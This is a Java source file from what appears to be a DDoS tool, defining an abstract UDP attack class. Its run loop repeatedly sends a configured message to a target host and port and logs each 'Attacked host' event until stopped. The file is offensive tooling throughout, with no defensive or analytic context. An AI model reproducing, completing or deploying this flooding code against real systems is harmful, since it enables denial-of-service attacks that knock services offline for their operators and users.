
package ddos.protocols.interfaces;

import ddos.DDOSPattern;
import ddos.DDOSer;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;


public abstract class UDP extends DDOS {
    private DatagramSocket socket;
    private DatagramPacket packet;

    
    public UDP(DDOSPattern ddosPattern) {
        super(ddosPattern);
    }
    
   
    @Override
    public void run() {
        createSocket();
        connectToSocket();
        while(!Thread.currentThread().isInterrupted() && !socket.isClosed() && DDOSer.stopThread != true) {
            writeLineToSocket(getDdosPattern().getMessage());
            DDOSer.appendToConsole("Attacked host "+getDdosPattern().getHost()+":"+getDdosPattern().getPort());
            try {
                Thread.sleep(getDdosPattern().getTimeout());
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
        closeSocket();
    }
    
    /**
     * Create the socket
     */
    protected void createSocket() {
        try {
            socket = new DatagramSocket(0);
            socket.setSoTimeout(getDdosPattern().getSocketTimeout());
        } catch (SocketException ex) {
            DDOSer.appendToConsole("Error while creating or accessing a Socket!");
            ex.printStackTrace();
        }
    }
    
    
    public abstract void writeLineToSocket(String message);
    
   
    protected void connectToSocket() {
        setAddress(new InetSocketAddress(getDdosPattern().getHost(),getDdosPattern().getPort()));
        packet = new DatagramPacket(new byte[1],1,getAddress());
    }
    
   
    protected void closeSocket() {
        if(socket != null && !socket.isClosed() && socket.isBound()) {
            socket.close();
        }
    }

    
    public DatagramSocket getSocket() {
        return socket;
    }

    
    public void setSocket(DatagramSocket socket) {
        this.socket = socket;
    }

  
    public DatagramPacket getPacket() {
        return packet;
    }

  
    public void setPacket(DatagramPacket packet) {
        this.packet = packet;
    }
}
